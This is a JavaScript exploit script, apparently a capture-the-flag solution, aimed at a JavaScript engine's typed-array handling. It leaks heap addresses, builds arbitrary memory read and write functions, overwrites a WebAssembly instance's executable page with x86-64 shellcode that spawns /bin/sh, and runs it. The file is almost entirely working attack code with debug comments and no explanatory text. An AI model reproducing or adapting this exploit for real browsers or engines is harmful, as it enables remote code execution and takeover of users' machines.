class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    d2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2d(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}
function getLeaked(start){
	addr = 0
	for(var i=3;i>=0;i--){
		addr += fff.charCodeAt(start+i);
		addr *= 256;
	}
	addr /= 256;
	return addr;
}
class Addr{
	constructor(lo,hi){
		this.lo = lo;
		this.hi = hi;
	}
}
function hex(a) {
    if (a == undefined) return "0xUNDEFINED";
    var ret = a.toString(16);
    if (ret.substr(0,2) != "0x") return "0x"+ret;
    else return ret;
}
var rrr = new Uint8Array([0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41]);
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]); var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var fff = rrr.toString()
fuck = [fff];
var xxx = new ArrayBuffer(rrr);
var yyy = [0.1,0.2,0.3,0.4,0.1,0.2,0.3,0.4,0.1,0.2,0.3,0.4,0.1,0.2,0.3,0.4,0.1,0.2,0.3,0.4];
arr = new Float64Array(yyy);
acdtql = new Uint32Array([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24]);

heap_lo = getLeaked(0x24c);
heap_hi = getLeaked(0x250);
console.log(hex(heap_hi),hex(heap_lo));

var GG = [12,23,34,45];
var GGg = [23,34,45,56];
var GGG = new Uint32Array(GG);
var GGGG = new Uint32Array(GGg);
//%DebugPrint(f);
//%DebugPrint(fuck);
//%DebugPrint(GGG);
//%DebugPrint(GGGG);
function aar(addr_lo, addr_hi){
	GGG.fill(0,55,57);
	GGG.fill(addr_lo,53,54);
	GGG.fill(addr_hi,54,55);
	data = new Addr(GGGG[0],GGGG[1]);
	return data;
}

function aar32(addr_lo, addr_hi){
	GGG.fill(0,55,57);
	GGG.fill(addr_lo,53,54);
	GGG.fill(addr_hi,54,55);
	return GGGG[0]
}

function aaw(addr_lo, addr_hi, w_lo, w_hi){
	GGG.fill(0,55,57);
	GGG.fill(addr_lo,53,54);
	GGG.fill(addr_hi,54,55);
	//%DebugPrint(f);
	//%DebugPrint(GGGG);
	//%SystemBreak();
	GGGG[0] = w_lo;
	GGGG[1] = w_hi;
}

base = aar(heap_lo+0x100,heap_hi);
base.lo = 0;
console.log(hex(base.hi),hex(base.lo));
instance = new Addr(base.lo+0x820f674, base.hi);
mmap = aar(instance.lo,instance.hi);
console.log(hex(mmap.hi),hex(mmap.lo));
var shellcode=[0x56f63148,0x622fbf48,0x2f2f6e69,0x54576873,0x583b6a5f,0x90050f99];
for(var i = 0; i< 3; i++){
	aaw(mmap.lo+i*8,mmap.hi,shellcode[2*i],shellcode[2*i+1]);
}
console.log("WRITE SUCCESS");
f();


